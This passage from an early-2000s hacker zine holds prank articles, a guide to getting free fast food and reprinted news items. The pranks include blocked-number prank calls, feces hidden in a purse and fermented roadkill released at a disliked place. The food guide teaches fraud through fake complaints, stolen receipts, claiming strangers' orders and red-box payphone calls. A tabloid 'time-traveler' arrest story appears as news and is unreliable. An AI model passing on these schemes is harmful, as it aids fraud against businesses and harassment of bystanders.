+  A. This may seem stupid now, however, when your 3/4 drunk this is indeed a
+  very very fucking funny ass thing to do. Esp, when you call up 45 minutes
+  later and demand to know where the fuck your pie is. And for shits and
+  giggles. Launch this over your cell phone as your walking to the place to get
+  a slice. Then you can watch it all go down while having dinner.. Talk about
+  free entertainment. Be sure to block your number. But that goes without
+  saying.. right??
+
+*Good Old Dog Shit in a Purse!
+  YES this is old. Yes this is soo fucking well known.. But damn, it works like
+  90% of the time. Its sooo fucking funny.. And everyones grandmother has
+  atleast like 4 fucking purses laying around just waiting for your
+  entertainment. If you cant find any dog shit. Well, grab a copy of k-1ine and
+  go fill that fucker up. Or just use something equally disgusting. For ideas
+  you can contact Phlux, he seems to have more than a few. We suggest filling
+  the purse with useless items, like a compact you punked from your sister,
+  some tissues (cause damn, old ladies fucking LOVE tissues) maybe some papers
+  or something and maybe some chapstick. Insure that the items are ontop of the
+  dog shit. So when hapless fucker looks inside, all he sees is whats expected
+  from an old lady purse. That is until he reaches inside.
+
+*Coercions Road-Kill Bonanza
+  Go around, collect some road-kill. Put this shit into a garbage bag.
+  Remember to double bag this bag of dead kill. After some kill is collected
+  fill the bag half way with water and let it ferment and permeate into a
+  delicious broth of disgust. For your own personal protection set the bag
+  in a can or rubbermaid container while its stewing to prevent unwanted
+  rupture. If you can set this in direct sunlight, go for it. Be sure to
+  aggitate this daily. Let this fucking shit stand for 4 days to a week. max.
+  Then haul the bag to a place you dont much care for or wish to fuck-up. Then
+  rip this fucker open as your ass is running like a motherfucker. Run far, run
+  fast, and dont stop or look back.. Suggested ripping tool is a sharp object
+  taped to a stick, do not run holding this, cause this fucking rank smell will
+  follow your ass.
+
+*Fucking with Store Clerks
+  Walking into a store and asking for weird things. Things which are gross.
+  I mean, be creative. Here is what a friend of mine did once while we were at
+  a mall. We noticed they were selling Habi-Trail. For those of you that dont
+  know wtf Habi-Trail is, Its a bunch of these pipes and shit which you can
+  connect to form elaborate yet cool pipe mazes for your hamster or rodent.
+  In a passing comment, I mentioned they should make a Central Vacuum adapter
+  for said Habi-Trail system (based on previous personal amusement). My friend
+  decided to go into the store and ask for this non-existant accessory. So, he
+  walks in, walks up to the counter and poses the million dollar question. The
+  clerk stands there for a second thinking, as if she thought it was real. Then
+  it suddenly occurs to her that hooking a Habi-Trail to a Central Vacuum
+  system may not be in the best interests of your pet hamster. She was clearly
+  an animal lover. This was made quite aparent in her recourse to said
+  question. Needless to say, they did not have it in stock.
+
+-=[ Conclusion ]=-
+
+Fucking with peoples sensibilities can be a fun and a rewarding hobby, even if
+you are totally unoriginal. Its a great way to pass boring time with the peeps
+or what have you.
+
+People are not as smart as they seem. By shaking up things a bit, you can make
+normal people do some really stupid shit. This article shows a few examples in
+a sea of ideas on how to fuck with unsuspecting people.
+
+Hopefully by reading this article you will have learned a bit about
+sensibilities and why you should hold them in high regard. You dont want to be
+on the other end of the stick. If you see a purse on the side of the road. Keep
+walking. In fact, speed up. If you see a twonie on the ground and it doesnt
+respond to your shoe moving it. Then perhaps you should think nothing of it and
+continue on your way. Choose not to be the cheap fat kid. Choose not to be the
+victim of sensibilities.
+
+I plan to release more articles with stories and ideas in the future. Clone
+willing that is.
+
+Anyways, Try not to physically harm or otherwise cause excessive property
+damage. Dont be a complete asshole. Prove them stupid, have some jokes. But
+dont totally push in their sheesh. Regarding coercions cocktail. uughh..
+
+(Keep in mind this was written over the phone at like 6am .. we were tired
+ and somewhat fucked up.. ^_^)
+
+
+-=[ Credits ]=-
+
+   Author: caesium <caesium@toronto2600.org>
+   Co-Author: Coercion <coercion@toronto2600.org>
+
+   Shouts: grinthock, Phlux, dec0de, Kris,
+           theclone, and the fat cheap kid.
+
+
+ --
+
+
+ Phrozen "I-know-I-fucked-up-so-shut-up" BloodFlame's Guide to Eating Free
+
+
+Ok, so those of you who read last month's issue of K-1ine may have noticed
+something I didn't. On the coupons that come from the change counting machines,
+it says something like "One AirMile per every 20 dollars" or some other bullshit
+like that.
+
+I fucked up. My bad. At best, this trick might work to get you AirMiles at a
+slightly faster rate than you normally would, at worst, it's a piece of shit.
+Once again, I fucked up. Sorry.
+
+This file is for informational purposes only, so if you decide to eat free by the
+means suggested in this file, and you get e. coli or some shit, or you get busted,
+or like, beaten to a bloody pulp by some burger flipping kid, it's your own damn
+fault.
+
+This one works tho... I ate for a couple of months like this. *reads disclaimer*
+
+Um... for research. Yeah.
+
+There are 2 ways to eat free, and both have their advantages and disadvantages.
+
+The first way is to go to the food bank. When I went, they didn't check up on me
+or anything they just took my word that I wasn't making enough money for food
+(which I wasn't at the time). After that I got food from them once every couple
+of months. Unfortunately, it wasn't nearly enough to last me a couple of months.
+The cool thing about the food bank, tho, is that if they give you something you
+don't like, they pretty much encourage you to bitch about it. Beggars can't be
+choosers? Fuck that. They give you bagels, and you prefer croissants? Tell them
+to give you the fucking croissants! It was great, cause you'd get enough food to
+last a few weeks (between 3 and 5), and it is all stuff you like. The disadvantage
+is that if you are merely hungry at 3 am, and don't have any coin, the food bank
+isn't open. What is an anarch to do? He is to go to McDonald's.
+
+If you go to McDonald's and order a number one, and they fuck it up somehow, i.e.,
+it's cold, there's special sauce dripping out the side all over the place, it's not
+a number one at all... what do you do? Go back and bitch about it. Bitch till they
+rectify their mistake. With another number one combo. Yay! Here's the catch tho: in
+times past, one merely needed to say they ordered a number one at about noon yesterday.
+(How many Big Mac Combo meals do you think they sell at noon? I dunno, either, but it's
+a fuckin' lot!) Now, however, you need to give a call the same day, complaining about
+your order, or provide them with a receipt.
+
+Aww, don't have a receipt? No problem, look in the parking lot. If that little pimple
+farm behind the counter doesn't come out and clean the lot every few minutes there's
+litter all over the place. Since they either staple the receipt to the bag, or just
+shove it inside the bag, where the bag goes, the receipt goes. Look for one that's
+stapled. I don't recommend reaching into the bag... that can get gross.
+
+Another good way to get receipts is to steal them off the counter. Burger King and
+Taco Bell in particular like to put receipts on the counter. I have no idea why.
+All that matters is that they do. Grab two or three as you walk by. Just don't let
+anyone catch you, cause sometimes large football player types get pissed off when
+you steal their receipts. Personally, I'm a smoker, so I can't run very far. Just
+watch yourself.
+
+Don't feel like standing in the parking lot waiting for a receipt? Go to a payphone,
+whip out your red box, and call McDonald's. Tell them that you just got home from work,
+and that you stopped at McDonald's for lunch earlier, or on your way home, or whatever...
+Don't tell them your order was five number 7s and a diet coke. Keep it simple. Make it
+something you know they sold at the hour you are complaining about. Just happened to
+hear someone order a specific order that would feed you and your friends at the drive
+through? Sweet... wait fifteen minutes, and tell them they fucked up the order completely.
+Come back a couple of hours later, or whatever, and get your free food. You'll be on the
+"Manager's List", or "Customer's Log". Can't hear the drive through? Can't see what's on
+that fucking red screen? Ok, maybe you're sitting inside, and you happen to notice someone
+sitting down with his girlfriend or some shit, and they happen to be eating a number-who
+fucking cares. Looks good, doesn't it? Wait till they leave. Call in. Tell them they fucked
+your order. Thing is, sometimes they look it up on the 'puter they have there, and if they
+didn't sell it, you don't get your food. I don't know what they can do beyond telling you
+to get out, but that's cause I've never been there, cause I'm so damn good.
+
+If you act like a first timer, tho, like you didn't know you had to call in or keep your
+receipt, more often than not the chick behind the counter will tell you she can do this
+for you "Just this once..." but a lot of the times they are real fuckers over the "proof"
+that you bought the meal to begin with. One time, I ate one meal a day for a week at the
+same location without calls or receipts. Always a different manager. Choice.
+
+In my experience, Burger King employs only the dumbest mothercanuckers on the planet, and
+they are real sticklers for having a receipt. I tried a call in there the other day, and I
+was told that "I'm the night manager, so I don't know what happened today." I told her she
+was a moron and that what had happened today was a bunch of people came in, ordered food,
+and left. At least one left with cold food. Didn't help. Stupid fucking broad. Another time,
+the bitch sat there trying to figure out how to use the computer to check the order I suppo-
+sedly made. Kept asking me what time. I said I don't know the exact fucking time... it was
+between 12:10 and 12:30! After getting somewhat agitated, she finally gave me my food and
+let me leave. So yeah, if you do Burger King, be ready for the fucking third degree, and
+if you're starving, and you can't survive without a burger in the next five minutes, hold
+out for a McDonald's, cause getting Burger King to give you a fucking sandwich is like
+pulling teeth for them. "Can't let the poor people take our sandwiches! We might lose
+upwards of a hundred dollars a month!" Phht... this coming from a huge multinational
+conglomerate who makes billions a year. Fuck'em. They write that shit off anyways.
+
+Some of the things that help, when you are complaining:
+
+Make it seem like you were really put out (like, "I only get one break, and I couldn't very
+well come back to complain about it..." I dunno, some shit, make it seem really inconvenient
+for you.
+
+Complaining that you didn't get fries will more often than not get you an order of fries,
+NOT an entire meal.
+
+Complaining that you ordered a number one, and that you got a number seven works really well,
+since "fish makes me gag."
+
+Being upset, but not angry at the girl, cause she's just trying to do her job, and she only
+gets 7 an hour. She doesn't get paid enough to put up with your shit, and if you take out
+your anger on her, she will probably just tell you to get out. Unless she's really intimidated
+by you. Best to be upset but polite at the same time.
+
+One of my favourites is saying "I ordered a number one, and got a Big Extra. Yeah, I don't
+know if you've ever had a Big Extra hot, but they are disgusting. Yeah, mine was cold."
+And since everyone knows that Big Extras are the most disgusting burger on the planet,
+chix0r might even feel sorry for you for choking down this piece of shit, then take you
+out back and give you some skully.
+
+Probably not, but she's fat anyways, so fuckit.
+
+Don't forget to mix it up a little. Go to McDonald's today, Burger King tomorrow, then maybe
+Arby's (Don't knock it, that roast beef sandwich rawks!), then hit Taco Bell, and Wendy's.
+I don't recommend hitting Harvey's or any of those mom and pop burger joints, cause they
+mostly make your burger custom, and if it gets all fucked up cause you don't like onions,
+well, you shouldn't have told her to put onions on it.
+
+Don't show up to the same restaurant on the same day of the week at the same time every week.
+Remember, this is a workplace. The manager you encountered on Monday at 5 pm will more than
+likely be there next Monday at 5 pm. She WILL catch on if you are there every Monday at 5.
+Mix it up.
+
+And there you have it... my poor attempt at rectifying last month's embarrassment of a file...
+GO! Eat! Drink! Be Merry! Start a fire! Steal a car! Run over an old lady! Quit buggin' me
+about my last file!
+
+Phrozen BloodFlame
+
+Special pr0ps go out to Jelly and GothyDude DayLight Assassin for helping me to fine tune and
+hone my skillz, and for coming up with a few inventive ways of getting accurate orders and such.
+
+04/13/03
+
+--
+
+
+ 	
+			    [  K-1ine News Bytes  ]
+
+
+	       	          "The Most Trusted Name In News"
+
+
+  --
+
+  Wired News: "Voicemail Hackers Phone It In"
+
+  02:00 AM Apr. 17, 2003 PT
+
+  http://www.wired.com/news/infostructure/0,1377,58517,00.html
+
+
+ Voicemail passwords are being transformed into all-access backstage passes that allow
+ malicious hackers to exploit voicemail systems, racking up huge charges on their unlucky
+ victims' phone bills.
+
+ Hackers are exploiting a combination of automated operator services from AT&T, voicemail
+ services from SBC Communications and consumers who haven't changed their default voicemail
+ passwords.
+
+ Victims say that AT&T and SBC know about the scam and are taking no concrete action to
+ protect consumers from it. But AT&T spokesman Gordon Diamond said that AT&T has been
+ instrumental in stopping the scam. 
+
+ "AT&T has ambitious programs that use sophisticated technology to detect and deter phone
+ scams and protect our customers," Diamond said. "We detected these scams, and we stopped
+ them. But technological deterrents can't do the job alone, and consumers and businesses
+ are responsible for ensuring the security of their phone lines."
+
+ Here's how the scam works: The default passwords that SBC issues to new users of their
+ voicemail services are in a specific format and are easily guessed.
+
+ If the default password is not changed after the system is set up, it's ripe for exploitation
+ by malicious hackers, who have been breaking into SBC voicemail systems and replacing the
+ owners' recorded greetings with recordings of a voice saying "yes" at appropriate intervals.
+
+ The hackers then place a collect call, typically from the Philippines or Saudi Arabia, to
+ the hacked system at an odd hour, assuming that the voicemail system will pick up.
+
+ AT&T uses an automated voice-recognition system when processing collect calls. The recording
+ asks whether the party who is being called will accept the charges. When the hacked system
+ responds "yes," the call is connected. 
+
+ Once connected, the hackers have been leaving the line open for hours -- and in some cases for
+ days -- resulting in enormous bills for the victim.
+
+ According to network security expert Mike Sweeney, there are a few reasons why the malicious
+ hackers might leave the line open.
+
+ "One is just to mind fuck with someone just because they can," said Sweeney. "But I also know
+ that hackers will set up conference calls this way to discuss various 'business deals' at no
+ cost to themselves. They might have set up the conference ... and just left the line up when
+ they were done -- it's the victims' dime, so why bother stopping it?"
+
+ K.C. Hatcher, a San Francisco graphic artist and one of the scam's casualties, has been billed
+ $12,000 dollars for calls that both she and AT&T agree she didn't make. But she's expected to
+ pay for those calls anyway, as are the other victims.
+
+ In Hatcher's case, the scam was carried out on her business line on New Year's Eve. Hatcher said
+ when she returned to the office after the holiday, she received a call from Bill Allen of AT&T
+ Fraud Detection, who told her he thought she was the victim of telephone fraud.
+
+ "I checked my outgoing message and discovered it had been altered, exactly as Mr. Allen said it
+ would be," Hatcher said. "In a man's voice with a foreign accent the new message stated something
+ like, 'Yes, yes, I will accept the charges, yes, yes, yes....'"
+
+ Hatcher said Allen then issued her a case number to dispute the charges once she received her next
+ phone bill. "He said that I probably would not have to pay the charges, as this type of incident
+ happened quite often, and that AT&T often waived the charges."
+
+ Later Hatcher was told that AT&T would take 35 percent off her bill, but she'd have to pay $8,000.
+
+ Hatcher was not happy.
+
+ "AT&T then suggested I 'go after' SBC, and SBC blames AT&T for holding the victim responsible for
+ the crime," Hatcher said. "Basically, these two communications giants are pointing the finger at
+ each other, and I'm caught in the middle with the bill to pay, or my credit will be ruined."
+
+ Other victims of the scam had the same experience.
+
+ "I got a call from AT&T's fraud division after Christmas, asking me to check my voicemail message,"
+ said Mary Runyon, a Texas-based photographer. "To my alarm, my outgoing message had been replaced
+ with a message from some man with a thick accent saying 'yes uh uh ... yes ... uh uh ... sure.'"
+
+ Runyon said that she was billed $7,256.34 for two calls; AT&T offered a 30 percent discount. When
+ she refused, her account was turned over to a collection agency.
+
+ "In the process of fighting this, I spoke to numerous people at AT&T and SBC. Not one sounded
+ surprised when I told them about this scam," Runyon said. "I got the distinct impression that
+ this scam is widespread and new victims are being exploited daily."
+
+ AT&T's Diamond said the scam is not being widely perpetrated.
+
+ "These are isolated incidents, and we do all we can to ensure the safety of our customers and our
+ network. However, in these instances, there is no question that the customer is in the best position
+ to ensure the security of their voicemail systems."
+
+ SBC said in a statement that the company includes a written warning to all new customers advising
+ them to change their default passwords immediately.
+
+ Runyon and Hatcher acknowledge that they didn't change their default passwords. Both said they later
+ discovered that the warning was included in a large package of information that appeared to reiterate
+ the conversation they'd had with a sales rep when they set up their accounts.
+
+ "I did not change my password because I was not expressly advised to do so," Hatcher said. "I hold both
+ companies responsible for not going to adequate measures to alert their consumers to a very expensive
+ problem so that we could at least try to protect ourselves from its occurrence."
+
+ SBC's written warning isn't enough, agreed Linda Sherry, executive director of the San Francisco
+ organization, Consumer Action. The company should have issued random default passwords that are not
+ easily guessed, as it now does for new business accounts.
+
+ Sherry also slammed AT&T for its automated system.
+
+ "That AT&T would permit third-party phone charges based only on the authority of a recorded message is
+ beyond belief," Sherry fumed. "Third-party billing should be allowed only when a real person answers
+ the phone and is able to verify that they approve the charges."
+
+ Diamond said AT&T has no plans to change the automated system, "which has proven to be extremely reliable
+ for many, many years."
+
+ MCI uses an automated system similar to AT&T's. Sprint uses live operators to process collect calls.
+
+ Consumer Action is asking AT&T and SBC to reimburse the scam victims.
+
+
+ --
+
+
+  'TIME-TRAVELER' BUSTED FOR INSIDER TRADING
+
+
+  Wednesday March 19, 2003
+
+  By CHAD KULTGEN
+
+  http://tv.yahoo.com/news/wwn/20030319/104808600007.html
+
+
+  NEW YORK -- Federal investigators have arrested an enigmatic Wall Street wiz on insider-trading
+  charges -- and incredibly, he claims to be a time-traveler from the year 2256! 
+
+  Sources at the Security and Exchange Commission confirm that 44-year-old Andrew Carlssin offered
+  the bizarre explanation for his uncanny success in the stock market after being led off in handcuffs
+  on January 28.
+
+  "We don't believe this guy's story -- he's either a lunatic or a pathological liar," says an SEC
+  insider.
+
+  "But the fact is, with an initial investment of only $800, in two weeks' time he had a portfolio
+  valued at over $350 million. Every trade he made capitalized on unexpected business developments,
+  which simply can't be pure luck. 
+
+  "The only way he could pull it off is with illegal inside information. He's going to sit in a jail
+  cell on Rikers Island until he agrees to give up his sources."
+
+  The past year of nose-diving stock prices has left most investors crying in their beer. So when
+  Carlssin made a flurry of 126 high-risk trades and came out the winner every time, it raised the
+  eyebrows of Wall Street watchdogs.
+
+  "If a company's stock rose due to a merger or technological breakthrough that was supposed to be
+  secret, Mr. Carlssin somehow knew about it in advance," says the SEC source close to the hush-hush,
+  ongoing investigation.
+
+  When investigators hauled Carlssin in for questioning, they got more than they bargained for: A mind-
+  boggling four-hour confession.
+
+  Carlssin declared that he had traveled back in time from over 200 years in the future, when it is common
+  knowledge that our era experienced one of the worst stock plunges in history. Yet anyone armed with know-
+  ledge of the handful of stocks destined to go through the roof could make a fortune.
+
+  "It was just too tempting to resist," Carlssin allegedly said in his videotaped confession. "I had planned
+  to make it look natural, you know, lose a little here and there so it doesn't look too perfect. But I just
+  got caught in the moment." 
+
+  In a bid for leniency, Carlssin has reportedly offered to divulge "historical facts" such as the whereabouts
+  of Osama Bin Laden and a cure for AIDS.
+
+  All he wants is to be allowed to return to the future in his "time craft."
+
+  However, he refuses to reveal the location of the machine or discuss how it works, supposedly out of fear
+  the technology could "fall into the wrong hands."
+
+  --
+
+
+                            -- Credits
+
+    Without the following contributions, this zine issue would be
+  fairly delayed or not released. So thank you to the following people:
+
+		CYB0RG/ASM, Caesium, Coercion, GrassMunk,
+  		  Magma, MsO, Phlux, TiTaNiA, The Clone 
+
+
+
+  -- Shouts:
+
+    CYB0RG/ASM, Wildman, H410g3n, warVamp, The Question, plappy, Phlux,
+    rt, Magma, Hack Canada, The Grasshopper Unit, Flippersmack, soapie,
+    Breanne, Flopik, dec0de, caesium, oz0n3, Kris, to2600.org, and lastly
+     to everyone and anyone who contributes to the Canadian H/P scene.
+
+
+                             ;.  .;..  ; ;. ;..
+                           ;..   .;..; .;.; .;; ;..
+                      .;..;. .;..;  .;.;...; ;..;..
+                         .;.         A         .;. .;.
+                       ;..   N E T T W E R K E D  ;..
+                        ;..;.. P R O D U C T   ;..;..
+                          .;..;               ;..;..
+                     ;  .;..;.;..   .; .  .;. ..;..
+                    .;..   . .;  ..;..;..;.. .;
+                ;..;.   .;.. . .;.. .;.;.
+              ..;. ..;.. .;.   ;.;..;;..;.;
+                ;.;;..;..      ;.;.; .; .
+                   ;.;..;. .;. ;.;:.;.
+                     ,;....;.
+               .;.;. .;.;
+              .;.;.;
+            .;.;
+            ;..;.
+           .;.;;.; .;. ..; ;. > > >  *chew chew chew* Whatcha eatin'?
